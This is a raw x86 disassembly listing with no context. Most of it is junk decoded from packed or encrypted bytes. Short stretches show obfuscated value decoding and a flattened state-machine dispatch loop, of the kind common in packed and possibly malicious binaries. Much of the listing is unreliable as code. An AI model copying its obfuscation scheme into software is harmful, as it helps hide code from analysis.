  40eaa2:	mov    dh,0x6f
  40eaa4:	ror    BYTE PTR [ebx],1
  40eaa6:	and    bh,BYTE PTR [edx-0x71e003b]
  40eaac:	iret   
  40eaad:	and    al,0xd7
  40eaaf:	adc    DWORD PTR [ebx-0x2d445caa],esp
  40eab5:	js     0x40ea8e
  40eab7:	jmp    0xbbb9:0x2278df7c
  40eabe:	test   BYTE PTR [edi],al
  40eac0:	popa   
  40eac1:	ins    DWORD PTR es:[edi],dx
  40eac2:	enter  0x3288,0x80
  40eac6:	lods   eax,DWORD PTR ds:[esi]
  40eac7:	xchg   esp,eax
  40eac8:	cmp    ah,BYTE PTR [esi-0x6e]
  40eacb:	retf   
  40eacc:	xor    edx,DWORD PTR [ecx+0x65fb6d7a]
  40ead2:	arpl   WORD PTR ds:0xaf735e64,cx
  40ead8:	sbb    eax,DWORD PTR [ebp+0x1abdb90c]
  40eade:	mov    ah,0xbb
  40eae0:	mov    dh,0x57
  40eae2:	das    
  40eae3:	jb     0x40ea91
  40eae5:	inc    esi
  40eae6:	in     al,dx
  40eae7:	sub    al,0xdd
  40eae9:	outs   dx,DWORD PTR ds:[esi]
  40eaea:	jecxz  0x40eb1e
  40eaec:	pop    ss
  40eaed:	jnp    0x40eb25
  40eaef:	mov    al,0x53
  40eaf1:	(bad)  
  40eaf2:	cmp    al,0x2c
  40eaf4:	imul   ebp,DWORD PTR [ebx],0x82d014d0
  40eafa:	add    BYTE PTR [edx],dh
  40eafc:	cmp    DWORD PTR fs:[ebx],edi
  40eaff:	loopne 0x40eaae
  40eb01:	xor    dh,BYTE PTR [ecx+0x424a6552]
  40eb07:	adc    al,bl
  40eb09:	jle    0x40eace
  40eb0b:	retf   0xdb28
  40eb0e:	jno    0x40eabd
  40eb10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb11:	mov    edx,esp
  40eb13:	xor    cl,BYTE PTR [edx]
  40eb15:	sbb    BYTE PTR [eax],cl
  40eb17:	sbb    BYTE PTR [bx],ah
  40eb1a:	fsub   QWORD PTR [eax+0x3be830b5]
  40eb20:	push   ss
  40eb21:	dec    eax
  40eb22:	imul   ebp,DWORD PTR [eax-0xcf71b60],0xbe470a03
  40eb2c:	test   BYTE PTR [edx+0x50290c09],ah
  40eb32:	mov    dl,0x3d
  40eb34:	ret    0xc0ac
  40eb37:	adc    BYTE PTR [ecx+0x3c41e3e6],ch
  40eb3d:	push   eax
  40eb3e:	mov    ecx,0xfa3a93f6
  40eb43:	cmp    dh,BYTE PTR [eax]
  40eb45:	jecxz  0x40ead6
  40eb47:	jle    0x40eb3a
  40eb49:	add    BYTE PTR [edx-0x20635626],cl
  40eb4f:	les    ebp,FWORD PTR [ecx-0x180319c2]
  40eb55:	stos   DWORD PTR es:[edi],eax
  40eb56:	adc    al,0x96
  40eb58:	loop   0x40eb7a
  40eb5a:	aam    0x52
  40eb5c:	cmp    al,0xba
  40eb5e:	aaa    
  40eb5f:	cmp    ebx,edx
  40eb61:	bound  ebp,QWORD PTR [esi-0x43fddc03]
  40eb67:	jecxz  0x40eb96
  40eb69:	sar    DWORD PTR [edx],1
  40eb6b:	scas   eax,DWORD PTR es:[edi]
  40eb6c:	push   edi
  40eb6d:	retf   
  40eb6e:	mov    dl,0x7d
  40eb70:	add    ch,0xe3
  40eb73:	inc    ebp
  40eb74:	stos   BYTE PTR es:[edi],al
  40eb75:	or     eax,0x49779735
  40eb7a:	mov    ?,eax
  40eb7c:	sbb    al,0xd4
  40eb7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb7f:	jne    0x40ebf0
  40eb81:	mov    ebx,0x6c56f018
  40eb86:	imul   edi,DWORD PTR [esi+ecx*8-0x2],0x7f125bc9
  40eb8e:	(bad)  
  40eb8f:	jmp    0xf42b4758
  40eb94:	mov    ebp,0xf1d01271
  40eb99:	and    dl,BYTE PTR [ecx]
  40eb9b:	mov    BYTE PTR [edi+ebx*2+0x55cf8d73],bl
  40eba2:	xchg   BYTE PTR [ebp+0x44f36b96],bl
  40eba8:	push   ebp
  40eba9:	jmp    DWORD PTR [esi+0x4de7aa01]
  40ebaf:	nop
  40ebb0:	jmp    0x40eb52
  40ebb2:	aam    0x85
  40ebb4:	inc    eax
  40ebb5:	not    BYTE PTR [eax+ebx*2]
  40ebb8:	mov    ch,0x9b
  40ebba:	es and eax,ebp
  40ebbd:	jmp    0x2390:0xab51d4db
  40ebc4:	xor    al,BYTE PTR [ebp+0x12]
  40ebc7:	out    dx,al
  40ebc8:	jg     0x40ec11
  40ebca:	add    DWORD PTR [edi+0xf],0x91a2bd3b
  40ebd1:	push   ds
  40ebd2:	out    0x9b,al
  40ebd4:	daa    
  40ebd5:	cmp    DWORD PTR [edi-0x60f2c1b7],0x1ae34810
  40ebdf:	jmp    0x40ebfd
  40ebe1:	push   0x744a62a3
  40ebe6:	adc    BYTE PTR [edx-0x6d],bl
  40ebe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebea:	mov    ds:0xb76687a7,eax
  40ebef:	push   es
  40ebf0:	aam    0xf6
  40ebf2:	les    esp,FWORD PTR [ecx-0x4f80ab1c]
  40ebf8:	sbb    edx,esi
  40ebfa:	xchg   esp,eax
  40ebfb:	loop   0x40ec4e
  40ebfd:	test   DWORD PTR [ebp-0x26e6dce3],edx
  40ec03:	pop    ebp
  40ec04:	xchg   ecx,eax
  40ec05:	cmp    esp,ebx
  40ec07:	push   esi
  40ec08:	(bad)  
  40ec09:	mov    esp,0xf54b304
  40ec0e:	sahf   
  40ec0f:	or     BYTE PTR [ebx+edx*4],dl
  40ec12:	ss jmp 0xeaa615cc
  40ec18:	idiv   ch
  40ec1a:	in     eax,dx
  40ec1b:	adc    esp,DWORD PTR [esi-0x4d]
  40ec1e:	adc    al,0xff
  40ec20:	dec    esi
  40ec21:	scas   eax,DWORD PTR es:[edi]
  40ec22:	fmul   DWORD PTR ds:[eax-0x6adea8c2]
  40ec29:	jb     0x40ec17
  40ec2b:	gs cmp dh,cl
  40ec2e:	jae    0x40ec5a
  40ec30:	sub    eax,0x6d981d48
  40ec35:	cs sub bl,ah
  40ec38:	jb     0x40ec3e
  40ec3a:	mov    BYTE PTR [ecx],cl
  40ec3c:	mov    edx,0x8df7eeac
  40ec41:	(bad)  
  40ec42:	mov    ah,0xec
  40ec44:	dec    edi
  40ec45:	es call 0x16db40f1
  40ec4b:	mov    eax,DWORD PTR [eax]
  40ec4d:	mov    DWORD PTR ds:0x4336eb,0x3f94
  40ec57:	mov    DWORD PTR [ebp-0x14],eax
  40ec5a:	mov    DWORD PTR ds:0x4336b3,0x877
  40ec64:	mov    eax,ds:0x413c66
  40ec69:	mov    DWORD PTR ds:0x43362f,0x4b6e
  40ec73:	mov    eax,DWORD PTR [eax]
  40ec75:	mov    DWORD PTR ds:0x433733,0x73ce
  40ec7f:	mov    DWORD PTR [ebp-0x18],eax
  40ec82:	mov    DWORD PTR ds:0x43373f,0x7077
  40ec8c:	jmp    0x40f1ad
  40ec91:	cmp    edi,0x33d
  40ec97:	jne    0x40f120
  40ec9d:	and    DWORD PTR [ebp+0x8],0x0
  40eca1:	mov    eax,DWORD PTR [ebp-0x8]
  40eca4:	sub    eax,DWORD PTR [ebp+0x8]
  40eca7:	push   eax
  40eca8:	mov    eax,DWORD PTR [ebp-0x4]
  40ecab:	add    eax,DWORD PTR [ebp+0x8]
  40ecae:	push   eax
  40ecaf:	jmp    0x40eedc
  40ecb4:	es addr16 mov esi,0x2465bf5c
  40ecbb:	gs mov dh,0x91
  40ecbe:	test   BYTE PTR [edx+ebx*8-0xac4416],bl
  40ecc5:	mov    eax,ds:0x7c0e7e7e
  40ecca:	jle    0x40ed4a
  40eccc:	jecxz  0x40ecd9
  40ecce:	(bad)  [esi]
  40ecd0:	cmp    edx,DWORD PTR [edx-0x4610feed]
  40ecd6:	(bad)  
  40ecd8:	or     edx,DWORD PTR ds:0xad8c1d2a
  40ecde:	sbb    al,0x8d
  40ece0:	daa    
  40ece1:	sub    al,0x2
  40ece3:	push   cs
  40ece4:	xor    al,0xd9
  40ece6:	test   eax,0x99f2d135
  40eceb:	and    ah,bl
  40eced:	(bad)  
  40ecee:	fisubr DWORD PTR [ebx]
  40ecf0:	jge    0x40ecea
  40ecf2:	mov    al,0x8f
  40ecf4:	ror    DWORD PTR [ebp+0x1619ec82],cl
  40ecfa:	sub    BYTE PTR [ebx],dl
  40ecfc:	ins    BYTE PTR es:[edi],dx
  40ecfd:	ins    BYTE PTR es:[edi],dx
  40ecfe:	fsub   QWORD PTR [edx]
  40ed00:	dec    esp
  40ed01:	sbb    dh,BYTE PTR [esi-0x77]
  40ed04:	push   ebx
  40ed05:	dec    eax
  40ed06:	aam    0x68
  40ed08:	mov    ebx,0x7d5d98d2
  40ed0d:	push   esi
  40ed0e:	test   al,0x11
  40ed10:	push   ss
  40ed11:	mov    cl,0x1
  40ed13:	ins    DWORD PTR es:[edi],dx
  40ed14:	hlt    
  40ed15:	mov    WORD PTR [esi+0x23],ss
  40ed18:	jmp    0xe02d:0xb9844e18
  40ed1f:	adc    bl,bl
  40ed21:	xchg   ecx,eax
  40ed22:	adc    ecx,DWORD PTR [edi-0x7dcf8eb]
  40ed28:	add    dl,BYTE PTR [edi]
  40ed2a:	imul   esp,ecx,0xffffffe4
  40ed2d:	xchg   ecx,eax
  40ed2e:	aaa    
  40ed2f:	jb     0x40ed39
  40ed31:	stos   DWORD PTR es:[edi],eax
  40ed32:	pop    ebx
  40ed33:	out    0x28,eax
  40ed35:	adc    ebx,esp
  40ed37:	push   ecx
  40ed38:	pop    ds
  40ed39:	dec    edi
  40ed3a:	and    eax,0x4eb783e
  40ed3f:	add    eax,0x7bdced70
  40ed44:	jmp    0x96a:0xd89dec20
  40ed4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed4c:	jecxz  0x40ed6c
  40ed4e:	rep cs stos DWORD PTR es:[edi],eax
  40ed51:	push   edi
  40ed52:	ret    0xb1af
  40ed55:	mul    BYTE PTR [edi-0x7e]
  40ed58:	clc    
  40ed59:	or     eax,0x1e150f93
  40ed5e:	add    dl,cl
  40ed60:	pop    esp
  40ed61:	dec    esp
  40ed62:	pop    ds
  40ed63:	mov    WORD PTR [esi-0x153993fc],fs
  40ed69:	or     BYTE PTR [esi],ah
  40ed6b:	cmp    DWORD PTR [ebp-0x4b71fd5f],ebp
  40ed71:	les    ecx,FWORD PTR [ebx]
  40ed73:	mov    dh,0x43
  40ed75:	dec    eax
  40ed76:	dec    ecx
  40ed77:	or     eax,esp
  40ed79:	out    dx,eax
  40ed7a:	mov    esp,0x9acc72b7
  40ed7f:	mov    dl,0x83
  40ed81:	mov    dh,0xee
  40ed83:	adc    ebp,esi
  40ed85:	stc    
  40ed86:	int3   
  40ed87:	pop    eax
  40ed88:	pop    ss
  40ed89:	sti    
  40ed8a:	mov    bl,0xc5
  40ed8c:	inc    eax
  40ed8d:	pusha  
  40ed8e:	cmp    BYTE PTR [eax+0x4f59c262],0xe1
  40ed95:	push   0x4c
  40ed97:	add    esp,DWORD PTR [ebx+0x7d]
  40ed9a:	add    DWORD PTR [ebx],ebp
  40ed9c:	ficomp WORD PTR gs:[edx-0x1c131458]
  40eda3:	cmp    cl,BYTE PTR [edx]
  40eda5:	mov    edx,0x1fe0d027
  40edaa:	push   ss
  40edab:	ret    
  40edac:	cmp    eax,0x6c496e7e
  40edb1:	es pop esi
  40edb3:	sub    BYTE PTR [eax],ch
  40edb5:	int3   
  40edb6:	jg     0x40ee0e
  40edb8:	(bad)  
  40edb9:	aam    0x90
  40edbb:	mov    eax,ds:0x11b0c459
  40edc0:	outs   dx,BYTE PTR ds:[esi]
  40edc1:	lea    esp,[edi]
  40edc3:	aad    0x60
  40edc5:	inc    ebx
  40edc6:	les    ebx,FWORD PTR [edi]
  40edc8:	xchg   ebp,eax
  40edc9:	aaa    
  40edca:	dec    esp
  40edcb:	in     al,dx
  40edcc:	out    0xd9,eax
  40edce:	into   
  40edcf:	stos   BYTE PTR es:[edi],al
  40edd0:	daa    
  40edd1:	sub    ch,bh
  40edd3:	xchg   edx,eax
  40edd4:	sti    
  40edd5:	push   ebp
  40edd6:	je     0x40ed9b
  40edd8:	pop    ebx
  40edd9:	outs   dx,DWORD PTR ds:[esi]
  40edda:	cmc    
  40eddb:	outs   dx,BYTE PTR ds:[esi]
  40eddd:	sub    eax,0xd9c71f85
  40ede2:	popf   
  40ede3:	push   eax
  40ede4:	aad    0x60
  40ede6:	push   DWORD PTR [ebx-0x70343501]
  40edec:	out    0x6f,al
  40edee:	ficomp DWORD PTR [edx-0x4e4a4c7]
  40edf4:	sub    eax,DWORD PTR [ebp+0x4106a460]
  40edfa:	cdq    
  40edfb:	jl     0x40ede3
  40edfd:	sar    DWORD PTR [edi],0xba
  40ee00:	xchg   edx,eax
  40ee01:	ret    
  40ee02:	mov    ebx,edx
  40ee04:	mov    cl,ch
  40ee06:	push   0xfd60f324
  40ee0b:	ins    BYTE PTR es:[edi],dx
  40ee0c:	push   es
  40ee0d:	jp     0x40ee68
  40ee0f:	dec    edx
  40ee10:	fwait
  40ee11:	mov    al,0x13
  40ee13:	pop    ebp
  40ee14:	mov    dh,0x36
  40ee16:	add    DWORD PTR [edi+0x38],ebp
  40ee19:	pop    ecx
  40ee1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee1b:	pop    ss
  40ee1c:	push   cs
  40ee1d:	jecxz  0x40ee1a
  40ee1f:	fs in  eax,0x5d
  40ee22:	xor    cl,BYTE PTR [ecx-0x1d]
  40ee25:	xchg   edx,eax
  40ee26:	retf   
  40ee27:	js     0x40ee47
  40ee29:	and    ah,dl
  40ee2b:	jne    0x40ee00
  40ee2d:	cmp    eax,0xe462bdfd
  40ee32:	inc    edi
  40ee33:	sbb    al,0xd4
  40ee35:	nop
  40ee36:	sub    eax,0xdaff8365
  40ee3b:	cmc    
  40ee3c:	mov    dl,0x23
  40ee3e:	fisub  WORD PTR [esp+edx*8-0x109dc21e]
  40ee45:	test   DWORD PTR [edx],0xf3ed5ac1
  40ee4b:	or     ah,BYTE PTR [edi]
  40ee4d:	arpl   WORD PTR [esi],dx
  40ee4f:	jmp    0xa850:0xf1bbe461
  40ee56:	xchg   esi,eax
  40ee57:	lahf   
  40ee58:	xor    DWORD PTR [edi-0xedbcecd],esi
  40ee5e:	sbb    eax,0x7ace794d
  40ee63:	(bad)  
  40ee64:	fst    QWORD PTR [edi+0x4bcc5ffc]
  40ee6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee6b:	mov    edx,0x7657fbfe
  40ee70:	mov    esi,0x5141d733
  40ee75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee76:	sbb    ah,ch
  40ee78:	sahf   
  40ee79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee7a:	jle    0x40eeaa
  40ee7c:	iret   
  40ee7d:	inc    edi
  40ee7f:	fcmovbe st,st(4)
  40ee81:	inc    edi
  40ee82:	mov    bl,0x43
  40ee84:	retf   
  40ee85:	ds int3 
  40ee87:	push   eax
  40ee88:	retf   0xe70
  40ee8b:	push   edx
  40ee8c:	cwde   
  40ee8d:	ret    0x4e3f
  40ee90:	cdq    
  40ee91:	ss inc edx
  40ee93:	dec    eax
  40ee94:	push   edi
  40ee95:	test   ebp,ecx
  40ee97:	mov    ah,0x13
  40ee99:	mov    al,0x90
  40ee9b:	dec    esp
  40ee9c:	ds int3 
  40ee9e:	mov    BYTE PTR [ecx-0x53b4fe27],0xa4
  40eea5:	lds    eax,FWORD PTR [ebp+ebp*1-0xcbeed70]
  40eeac:	jge    0x40ef09
  40eeae:	jo     0x40ee4b
  40eeb0:	lahf   
  40eeb1:	dec    edx
  40eeb2:	(bad)  
  40eeb3:	sub    BYTE PTR [eax-0x13332ba],cl
  40eeb9:	mov    edx,0xfbcdc21
  40eebe:	dec    ebx
  40eebf:	cmp    al,0x5a
  40eec1:	sub    al,0xdf
  40eec3:	test   eax,0x76fb2f0e
  40eec8:	loop   0x40ef16
  40eeca:	jne    0x40ef1f
  40eecc:	cld    
  40eecd:	loope  0x40eeb5
  40eecf:	mov    WORD PTR [ebp-0x3c26018a],?
  40eed5:	ds lock add al,0xd1
  40eed9:	jno    0x40ee6b
  40eedb:	shr    eax,0x9d
  40eede:	pop    ebx
  40eedf:	(bad)  
  40eee0:	(bad)  
  40eee1:	inc    DWORD PTR [ebp+0x8]
  40eee4:	cmp    DWORD PTR [ebp+0x8],0x52
  40eee8:	jb     0x40eca1
  40eeee:	jmp    0x40f1ad
  40eef3:	jmp    0x40f120
  40eef8:	lds    ebp,FWORD PTR [edx+0x1371069f]
  40eefe:	imul   ecx,DWORD PTR gs:[ebx-0x216710ba],0x8fcfc84d
  40ef09:	scas   eax,DWORD PTR es:[edi]
  40ef0a:	jle    0x40ef8a
  40ef0c:	push   cs
  40ef0d:	jl     0x40ef8d
  40ef0f:	jle    0x40eef0
  40ef11:	(bad)  
  40ef12:	bound  eax,QWORD PTR [ebp-0x7a]
  40ef15:	stos   DWORD PTR es:[edi],eax
  40ef16:	call   0xc414:0xb01ed4f7
  40ef1d:	repnz lea esi,ds:0x93359d22
  40ef24:	popa   
  40ef25:	inc    ebp
  40ef26:	dec    edi
  40ef27:	(bad)  
  40ef28:	enter  0x1b35,0xa5
  40ef2c:	stos   BYTE PTR es:[edi],al
  40ef2d:	es dec ebp
  40ef2f:	mov    edi,DWORD PTR [edi+0x1c26bf2a]
  40ef35:	rcr    BYTE PTR [eax-0x66efc230],cl
  40ef3b:	and    al,0xb8
  40ef3d:	or     BYTE PTR [ecx-0x2],cl
  40ef40:	dec    eax
  40ef41:	retf   
  40ef42:	jae    0x40ef13
  40ef44:	or     DWORD PTR [esi+0x3d],ebx
  40ef47:	into   
  40ef48:	sbb    dh,ah
  40ef4a:	pop    eax
  40ef4b:	mov    ebp,0x3d552104
  40ef50:	mov    ebp,0x838e1174
  40ef55:	cmp    ah,BYTE PTR [eax-0x1903cb38]
  40ef5b:	imul   esi,DWORD PTR [ebp+0x5e],0xaeef6578
  40ef62:	ins    DWORD PTR es:[edi],dx
  40ef63:	cmp    al,0x9f
  40ef65:	jbe    0x40ef13
  40ef67:	sar    bl,0xec
  40ef6a:	sbb    al,0xc
  40ef6c:	cmp    esi,DWORD PTR [ebp+0x13]
  40ef6f:	mov    al,0x31
  40ef71:	movd   mm3,DWORD PTR [ecx]
  40ef74:	out    dx,al
  40ef75:	addr16 stc 
  40ef77:	fsubp  st(1),st
  40ef79:	pushf  
  40ef7a:	mov    esp,0x4a103c08
  40ef7f:	gs loopne 0x40efd4
  40ef82:	xchg   ecx,eax
  40ef83:	mov    es,WORD PTR [esi]
  40ef85:	cmp    BYTE PTR [edi+0x7a],ch
  40ef88:	sbb    al,0x31
  40ef8a:	sti    
  40ef8b:	(bad)  [edx]
  40ef8d:	cmp    edi,eax
  40ef8f:	out    0x2,eax
  40ef91:	jns    0x40f008
  40ef93:	xor    al,0xeb
  40ef95:	cmp    esp,esi
  40ef97:	push   ecx
  40ef98:	out    0xda,eax
  40ef9a:	leave  
  40ef9b:	mov    bh,0x9b
  40ef9d:	lods   al,BYTE PTR ds:[esi]
  40ef9e:	pop    edi
  40ef9f:	xor    eax,0xbcfac839
  40efa4:	and    DWORD PTR [edx+0x3d7fe5f0],ecx
  40efaa:	in     eax,0x54
  40efac:	cmp    BYTE PTR [eax+0x37766e01],0x46
  40efb3:	xchg   BYTE PTR [ebp-0x6415c2b6],dl
  40efb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efba:	(bad)  
  40efbb:	nop
  40efbc:	cmp    dl,BYTE PTR [ecx]
  40efbe:	xchg   esi,eax
  40efbf:	pop    edi
  40efc0:	push   ss
  40efc1:	jle    0x40effa
  40efc3:	xor    BYTE PTR [edi],ch
  40efc5:	push   es
  40efc6:	in     eax,dx
  40efc7:	aam    0x2e
  40efc9:	fwait
  40efca:	andps  xmm4,XMMWORD PTR [eax]
  40efcd:	xchg   DWORD PTR [eax+edx*2],ecx
  40efd0:	into   
  40efd1:	ficomp DWORD PTR [eax]
  40efd3:	lods   eax,DWORD PTR ds:[esi]
  40efd4:	dec    eax
  40efd5:	sub    BYTE PTR [edi],ah
  40efd7:	popf   
  40efd8:	out    0xc3,eax
  40efda:	(bad)  
  40efdb:	jp     0x40efbd
  40efdd:	(bad)  
  40efde:	adc    BYTE PTR [ebx],ch
  40efe0:	sbb    dl,BYTE PTR [eax+0x536cecbf]
  40efe6:	nop
  40efe7:	stos   DWORD PTR es:[edi],eax
  40efe8:	pop    ecx
  40efe9:	mov    edi,ss
  40efeb:	stos   DWORD PTR es:[edi],eax
  40efec:	pop    ds
  40efed:	and    dl,dl
  40efef:	or     ah,BYTE PTR [edi]
  40eff1:	sar    BYTE PTR [edx],cl
  40eff3:	aas    
  40eff4:	daa    
  40eff5:	add    esi,esp
  40eff7:	inc    ecx
  40eff8:	xchg   esp,eax
  40eff9:	ins    DWORD PTR es:[di],dx
  40effb:	xchg   dh,al
  40effd:	mov    ebx,0x97bb5901
  40f002:	inc    ebx
  40f003:	fcomp  st(3)
  40f005:	and    DWORD PTR [eax+0x543796aa],ebx
  40f00b:	or     DWORD PTR [ecx-0x78a6019c],0x93ce203d
  40f015:	lock jb 0x40f001
  40f018:	xor    ch,ch
  40f01a:	cmp    eax,0x4149fbb5
  40f01f:	sub    DWORD PTR [ebx+0x28],esi
  40f022:	(bad)  
  40f023:	adc    eax,DWORD PTR [eax]
  40f025:	xchg   edi,eax
  40f026:	addr16 dec edi
  40f028:	imul   edi
  40f02a:	push   0xffffffdb
  40f02c:	or     ecx,0x10b6f4e0
  40f032:	adc    eax,DWORD PTR [ecx+0x31]
  40f035:	push   esi
  40f036:	cwde   
  40f037:	pop    ds
  40f038:	sub    cl,dl
  40f03a:	sub    DWORD PTR [ebx],esi
  40f03c:	add    DWORD PTR [eax],0xf2ffc758
  40f042:	fadd   DWORD PTR [ebx]
  40f044:	mov    edx,0xdd7063be
  40f049:	inc    ebx
  40f04a:	mov    ds:0x28304354,eax
  40f04f:	pop    ebp
  40f050:	out    dx,al
  40f051:	sti    
  40f052:	icebp  
  40f053:	push   esp
  40f054:	sub    esp,DWORD PTR [ebx]
  40f056:	inc    DWORD PTR [ecx-0x5cf87488]
  40f05c:	out    0xb1,eax
  40f05e:	cwde   
  40f05f:	inc    ecx
  40f060:	xchg   DWORD PTR [eax+0x7a87eed4],ebp
  40f066:	(bad)  
  40f067:	stc    
  40f068:	sar    cl,0x69
  40f06b:	mov    eax,ds:0x91612757
  40f070:	jae    0x40f07b
  40f072:	daa    
  40f073:	and    eax,DWORD PTR [ecx]
  40f075:	sti    
  40f076:	aas    
  40f077:	lock and DWORD PTR [edi-0x37070fc6],ebp
  40f07e:	push   0x22
  40f080:	mov    al,ds:0xddd4f99b
  40f085:	out    dx,eax
  40f086:	xlat   BYTE PTR ds:[ebx]
  40f087:	imul   esp,DWORD PTR [ecx+0x43],0x235fbee4
  40f08e:	adc    edx,DWORD PTR [ebx]
  40f090:	push   es
  40f091:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40f093:	rcr    DWORD PTR [edi],1
  40f095:	fs lahf 
  40f097:	xchg   ebp,eax
  40f098:	jb     0x40f0da
  40f09a:	xchg   ebp,eax
  40f09b:	stos   DWORD PTR es:[edi],eax
  40f09c:	rol    DWORD PTR fs:[ebx+ebp*1+0x2b87641f],0x70
  40f0a5:	sbb    edi,DWORD PTR [ecx+0x6e8bf7d5]
  40f0ab:	lods   eax,DWORD PTR ds:[esi]
  40f0ac:	shl    BYTE PTR [ecx+0x6a424659],0x3
  40f0b3:	cmovae eax,esp
  40f0b6:	jo     0x40f097
  40f0b8:	pop    esi
  40f0b9:	jne    0x40f04e
  40f0bb:	popa   
  40f0bc:	inc    ecx
  40f0bd:	fcomp  st(6)
  40f0bf:	or     BYTE PTR [ebx+0x11],0xd2
  40f0c3:	xchg   edi,eax
  40f0c4:	daa    
  40f0c5:	mov    ds:0x3bdb14d5,eax
  40f0ca:	imul   ecx,DWORD PTR [ebx],0x8b0190d8
  40f0d0:	jne    0x40f0a3
  40f0d2:	push   esi
  40f0d3:	mov    ah,0xde
  40f0d5:	cmp    eax,0x7863d360
  40f0da:	sub    eax,edx
  40f0dc:	or     eax,edi
  40f0de:	test   eax,0xf4136785
  40f0e3:	(bad)  
  40f0e4:	mov    edx,0x63312ec2
  40f0e9:	jmp    0xe139:0xd8addb21
  40f0f0:	jmp    0x77fe:0xf40afbd2
  40f0f7:	out    0x1,al
  40f0f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0fa:	mov    esp,DWORD PTR [eax-0x31]
  40f0fd:	sti    
  40f0fe:	pop    esi
  40f0ff:	jo     0x40f09d
  40f101:	stos   BYTE PTR es:[edi],al
  40f102:	sbb    DWORD PTR [eax-0x51],edi
  40f105:	dec    ecx
  40f106:	ds pop ecx
  40f108:	clc    
  40f109:	nop
  40f10a:	sbb    DWORD PTR [eax],ecx
  40f10c:	xchg   DWORD PTR [ebp+0x7f],eax
  40f10f:	ja     0x40f11e
  40f111:	inc    ecx
  40f112:	pop    edi
  40f113:	std    
  40f114:	adc    al,0xea
  40f116:	repz cmp ebx,DWORD PTR [edx+0x376d61c]
  40f11d:	daa    
  40f11e:	cmp    eax,0xa3ff8136
  40f123:	add    DWORD PTR [eax],eax
  40f125:	add    BYTE PTR [edi],cl
  40f127:	test   DWORD PTR [edi+0x0],ecx
  40f12a:	add    BYTE PTR [eax],al
  40f12c:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40f133:	mov    eax,DWORD PTR [ebp-0x4]
  40f136:	mov    DWORD PTR [ebp-0x5c],eax
  40f139:	mov    eax,DWORD PTR [ebp-0x8]
  40f13c:	mov    DWORD PTR [ebp-0x58],eax
  40f13f:	mov    eax,DWORD PTR [ebp-0xc]
  40f142:	xor    eax,esi
  40f144:	add    eax,ebx
  40f146:	mov    DWORD PTR [ebp-0x54],eax
  40f149:	lea    eax,[ebp-0x1c]
  40f14c:	mov    DWORD PTR [ebp-0x50],eax
  40f14f:	mov    eax,DWORD PTR [ebp-0x60]
  40f152:	xor    eax,esi
  40f154:	add    eax,ebx
  40f156:	mov    DWORD PTR [ebp-0x60],eax
  40f159:	lea    eax,[ebp-0x60]
  40f15c:	push   eax
  40f15d:	mov    eax,DWORD PTR [ebp+0xc]
  40f160:	xor    eax,esi
  40f162:	add    eax,ebx
  40f164:	push   eax
  40f165:	mov    eax,ds:0x413bfe
  40f16a:	push   0x413b54
  40f16f:	push   DWORD PTR [eax]
  40f171:	call   0x40c099
  40f176:	jmp    0x40f1ad
  40f17b:	cmp    edi,0x13d
  40f181:	jne    0x40f1ad
  40f187:	mov    eax,DWORD PTR [ebp-0x10]
  40f18a:	xor    eax,esi
  40f18c:	add    eax,ebx
  40f18e:	mov    DWORD PTR [ebp+0x8],eax
  40f191:	mov    eax,ds:0x413bde
  40f196:	mov    DWORD PTR [ebp+0x8],eax
  40f199:	mov    eax,DWORD PTR [ebp-0x14]
  40f19c:	mov    DWORD PTR [ebp-0x4],eax
  40f19f:	mov    eax,DWORD PTR [ebp-0x4]
  40f1a2:	push   0x4
  40f1a4:	pop    ecx
  40f1a5:	sub    ecx,eax
  40f1a7:	add    ecx,DWORD PTR [ebp-0x18]
  40f1aa:	mov    DWORD PTR [ebp-0x8],ecx
  40f1ad:	mov    eax,DWORD PTR [ebp+0xc]
  40f1b0:	xor    eax,esi
  40f1b2:	lea    edi,[edi+eax*1+0x32729b]
  40f1b9:	cmp    edi,0x50b
  40f1bf:	jne    0x40ea09
  40f1c5:	mov    eax,DWORD PTR [ebp+0xc]
  40f1c8:	pop    edi
  40f1c9:	xor    eax,esi
  40f1cb:	jmp    0x40f3f8
  40f1d0:	push   edx
  40f1d1:	mov    ecx,0x7215e615
  40f1d6:	jno    0x40f241
  40f1d8:	scas   al,BYTE PTR es:[edi]
  40f1d9:	out    dx,al
  40f1da:	lds    esp,FWORD PTR [edx-0x488254ef]
  40f1e0:	lahf   
  40f1e1:	lods   eax,DWORD PTR ds:[esi]
  40f1e2:	jle    0x40f262
  40f1e4:	push   cs
  40f1e5:	jl     0x40f265
  40f1e7:	jle    0x40f1b7
  40f1e9:	mov    ebx,DWORD PTR [esi+0x23]
  40f1ec:	stos   BYTE PTR es:[edi],al
  40f1ed:	mov    dh,0xd0
  40f1ef:	xor    al,0x50
  40f1f1:	shl    BYTE PTR [edx-0x3d],1
  40f1f4:	fst    QWORD PTR [ecx]
  40f1f6:	jl     0x40f22a
  40f1f8:	xchg   edi,eax
  40f1f9:	pop    esi
  40f1fa:	je     0x40f21b
  40f1fc:	sbb    cl,BYTE PTR [edx-0x3f]
  40f1ff:	jb     0x40f208
  40f201:	dec    esp
  40f202:	xchg   esi,eax
  40f203:	add    cl,BYTE PTR [edi-0x13]
  40f206:	mov    ds:0x4e95a854,al
  40f20b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f20c:	ins    BYTE PTR es:[edi],dx
  40f20d:	add    esp,edi
  40f20f:	push   edi
  40f210:	rcr    DWORD PTR [eax+ebp*2],1
  40f213:	mov    bl,0x78
  40f215:	jb     0x40f1bb
  40f217:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f218:	imul   ecx,ecx,0xffffffbe
  40f21b:	scas   eax,DWORD PTR es:[edi]
  40f21c:	lods   al,BYTE PTR ds:[esi]
  40f21d:	sbb    edx,DWORD PTR [ebx-0x6b]
  40f220:	mov    ecx,0xb8c0ffa5
